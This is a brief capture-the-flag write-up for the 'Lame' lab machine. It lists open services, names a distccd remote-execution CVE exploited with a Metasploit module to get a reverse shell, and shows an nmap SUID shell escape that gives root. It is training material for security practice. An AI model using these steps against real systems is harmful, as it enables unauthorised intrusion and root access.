# Lame

### Reconnaissance

- port 21/tcp FTP vsftpd 2.3.4
- port 22/tcp SSH OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
- port 139/tcp netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
- port 445/tcp SMB Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
- port 3632/tcp distccd distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))

Target is vulnerable to CVE 2004-2687 allowing RCE through port 3632

### Exploitation

Running metsaploit's distcc_exec module grants us a reverse shell on the target

### Privilege Escalation

Nmap has the SUID bit set in /usr/bin/nmap allowing us access to a root shell

```
nmap --interactive
nmap> !sh
# whoami
root
```

*Note: The official walkthrough exploits the vulnerable Samba version to gain a root shell directly*
